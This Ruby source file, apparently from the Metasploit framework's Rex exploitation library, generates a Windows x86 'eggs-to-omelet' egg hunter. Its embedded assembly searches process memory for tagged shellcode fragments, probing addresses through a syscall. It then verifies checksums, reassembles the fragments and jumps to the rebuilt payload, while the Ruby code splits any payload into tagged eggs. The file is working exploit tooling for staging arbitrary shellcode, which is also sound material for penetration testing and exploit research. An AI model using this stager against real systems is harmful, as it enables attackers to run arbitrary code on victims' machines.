# -*- coding: binary -*-
require 'rex/text'
require 'rex/arch'
require 'metasm'


module Rex
module Exploitation

###
#
# This class provides an interface to generating an eggs-to-omelet hunter for win/x86.
#
# Written by corelanc0d3r <peter.ve@corelan.be>
#
###
class Omelet

  ###
  #
  # Windows-based eggs-to-omelet hunters
  #
  ###
  module Windows
    Alias = "win"

    module X86
      Alias = ARCH_X86

      #
      # The hunter stub for win/x86.
      #
      def hunter_stub
        {
          # option hash members go here (currently unused)
        }
      end

    end
  end

  ###
  #
  # Generic interface
  #
  ###

  #
  # Creates a new hunter instance and acquires the sub-class that should
  # be used for generating the stub based on the supplied platform and
  # architecture.
  #
  def initialize(platform, arch = nil)
    Omelet.constants.each { |c|
      mod = self.class.const_get(c)

      next if ((!mod.kind_of?(::Module)) or (!mod.const_defined?('Alias')))

      if (platform =~ /#{mod.const_get('Alias')}/i)
        self.extend(mod)

        if (arch and mod)
          mod.constants.each { |a|
            amod = mod.const_get(a)

            next if ((!amod.kind_of?(::Module)) or
              (!amod.const_defined?('Alias')))

            if (arch =~ /#{mod.const_get(a).const_get('Alias')}/i)
                amod = mod.const_get(a)

                self.extend(amod)
              end
            }
          end
        end
      }
    end

    #
    # This method generates an eggs-to-omelet hunter using the derived hunter stub.
    #
    def generate(payload, badchars = '', opts = {})

      eggsize       = opts[:eggsize] || 123
      eggtag        = opts[:eggtag] || "00w"
      searchforward = opts[:searchforward] || true
      reset         = opts[:reset]
      startreg      = opts[:startreg]
      usechecksum   = opts[:checksum]
      adjust        = opts[:adjust] || 0

      return nil if ((opts = hunter_stub) == nil)

      # calculate number of eggs
      payloadlen = payload.length
      delta = payloadlen / eggsize
      delta = delta * eggsize
      nr_eggs = payloadlen / eggsize
      if delta < payloadlen
        nr_eggs = nr_eggs+1
      end

      nr_eggs_hex = "%02x" % nr_eggs
      eggsize_hex = "%02x" % eggsize

      hextag = ''
      eggtag.each_byte do |thischar|
        decchar = "%02x" % thischar
        hextag = decchar + hextag
      end
      hextag = hextag + "01"

      # search forward or backward ?
      setflag      = nil
      searchstub1  = nil
      searchstub2  = nil
      flipflagpre  = ''
      flipflagpost = ''
      checksum     = ''

      if searchforward
        # clear direction flag
        setflag     = "cld"
        searchstub1 = "dec edx\n\tdec edx\n\tdec edx\n\tdec edx"
        searchstub2 = "inc edx"
      else
        # set the direction flag
        setflag      = "std"
        searchstub1  = "inc edx\n\tinc edx\n\tinc edx\n\tinc edx"
        searchstub2  = "dec edx"
        flipflagpre  = "cld\n\tsub esi,-8"
        flipflagpost = "std"
      end

      # will we have to adjust the destination address ?
      adjustdest = ''
      if adjust > 0
        adjustdest = "\n\tsub edi,#{adjust}"
      elsif adjust < 0
        adjustdest = "\n\tadd edi,#{adjust}"
      end

      # prepare the stub that starts the search
      startstub = ''
      if startreg
        if startreg.downcase != 'ebp'
          startstub << "mov ebp,#{startreg}"
        end
        startstub << "\n\t" if startstub.length > 0
        startstub << "mov edx,ebp"
      end
      # a register will be used as start location for the search
      startstub << "\n\t" if startstub.length > 0
      startstub << "push esp\n\tpop edi\n\tor di,0xffff"
      startstub << adjustdest
      # edx will be used, start at end of stack frame
      if not startreg
        startstub << "\n\tmov edx,edi"
        if reset
          startstub << "\n\tpush edx\n\tpop ebp"
        end
      end

      # reset start after each egg was found ?
      # will allow to find eggs when they are out of order/sequence
      resetstart = ''
      if reset
        resetstart = "push ebp\n\tpop edx"
      end

         		#checksum code by dijital1 & corelanc0d3r
      if usechecksum
        checksum = <<EOS
  xor ecx,ecx
  xor eax,eax
calc_chksum_loop:
  add al,byte [edx+ecx]
  inc ecx
  cmp cl, egg_size
  jnz calc_chksum_loop
test_chksum:
  cmp al,byte [edx+ecx]
  jnz find_egg
EOS
      end

      # create omelet code
      omelet_hunter = <<EOS

  nr_eggs equ 0x#{nr_eggs_hex}	; number of eggs
  egg_size equ 0x#{eggsize_hex} 	; nr bytes of payload per egg
  hex_tag equ 0x#{hextag}		; tag

  #{setflag}			; set/clear direction flag
  jmp start

  ; routine to calculate the target location
  ; for writing recombined shellcode (omelet)
  ; I'll use EDI as target location
  ; First, I'll make EDI point to end of stack
  ; and I'll put the number of shellcode eggs in eax
get_target_loc:
  #{startstub}		; use edx as start location for the search
  xor eax,eax		; zero eax
  mov al,nr_eggs		; put number of eggs in eax

calc_target_loc:
  xor esi,esi		; use esi as counter to step back
  mov si,0-(egg_size+20)	; add 20 bytes of extra space, per egg

get_target_loc_loop:	; start loop
  dec edi		; step back
  inc esi		; and update ESI counter
  cmp si,-1	; continue to step back until ESI = -1
  jnz get_target_loc_loop
  dec eax		; loop again if we did not take all pieces
               ; into account yet
  jnz calc_target_loc

  ; edi now contains target location
  ; for recombined shellcode
  xor ebx,ebx		; put loop counter in ebx
  mov bl,nr_eggs+1
  ret

start:
  call get_target_loc	; jump to routine which will calculate shellcode dst address

  ; start looking for eggs, using edx as basepointer
  jmp search_next_address

find_egg:
  #{searchstub1}		; based on search direction

search_next_address:
  #{searchstub2}		; based on search direction
  push edx		; save edx
  push 0x02   ; use NtAccessCheckAndAuditAlarm syscall
  pop eax		; set eax to 0x02
  int 0x2e
  cmp al,0x5		; address readable ?
  pop edx		; restore edx
  je search_next_address  ; if addressss is not readable, go to next address

  mov eax,hex_tag	; if address is readable, prepare tag in eax
  add eax,ebx		; add offset (ebx contains egg counter, remember ?)
  xchg edi,edx		; switch edx/edi
  scasd			; edi points to the tag ?
  xchg edi,edx		; switch edx/edi back
  jnz find_egg		; if tag was not found, go to next address
  ;found the tag at edx

   ;do we need to verify checksum ? (prevents finding corrupted eggs)
   #{checksum}

copy_egg:
  ; ecx must first be set to egg_size (used by rep instruction) and esi as source
  mov esi,edx		; set ESI = EDX (needed for rep instruction)
  xor ecx,ecx
  mov cl,egg_size	; set copy counter
  #{flipflagpre}		; flip destination flag if necessary
  rep movsb		; copy egg from ESI to EDI
  #{flipflagpost}		; flip destination flag again if necessary
  dec ebx		; decrement egg
  #{resetstart}		; reset start location if necessary
  cmp bl,1		; found all eggs ?
  jnz find_egg		; no = look for next egg
  ; done - all eggs have been found and copied

done:
  call get_target_loc	; re-calculate location where recombined shellcode is placed
  cld
  jmp edi		; and jump to it :)
EOS

      the_omelet = Metasm::Shellcode.assemble(Metasm::Ia32.new, omelet_hunter).encode_string

      # create the eggs array
      total_size = eggsize * nr_eggs
      padlen = total_size - payloadlen
      payloadpadding = "A" * padlen

      fullcode = payload + payloadpadding
      eggcnt = nr_eggs + 2
      startcode = 0

      eggs = []
      while eggcnt > 2 do
        egg_prep = eggcnt.chr + eggtag
        this_egg = fullcode[startcode, eggsize]
            if usechecksum
          cksum = 0
          this_egg.each_byte { |b|
            cksum += b
          }
          this_egg << [cksum & 0xff].pack('C')
        end

        this_egg = egg_prep + this_egg
        eggs << this_egg

        eggcnt -= 1
        startcode += eggsize
      end

      return [ the_omelet, eggs ]
    end

protected

  #
  # Stub method that is meant to be overridden.  It returns the raw stub that
  # should be used as the omelet maker (combine the eggs).
  #
  def hunter_stub
  end

end
end
end
